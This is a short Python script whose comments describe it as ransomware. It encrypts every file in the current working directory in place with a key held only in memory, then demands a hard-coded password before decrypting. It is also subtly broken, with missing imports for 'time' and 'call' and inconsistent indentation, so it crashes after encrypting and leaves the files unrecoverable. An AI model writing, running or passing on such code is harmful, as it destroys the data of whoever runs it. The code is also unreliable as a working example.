import os
from cryptography.fernet import Fernet

# Searching for file to encrypt exept from the ransomware file
files = []

for file in os.listdir():
	if file == "LOL.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

# Creating a encrpytionkey that will be used to lock the found files
secretkey = Fernet.generate_key()

# Going through the files list and encrpying everything
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(secretkey).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
   
print("LOL")   

time.sleep(5)
# Password to run the script. DO NOT USE THIS AS THE DECRIPT PASSWORD
password = "LOL"


userInput = input("LOL")
time.sleep(2)

# Checking the password that the user put in, if its right the user will get a message saying the files are decrypted 
# and if its wrong a message saying that the password is wrong
if userInput == password:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print(" ")

else:
	time.sleep(1)
  call(["python", "LOL.py"])
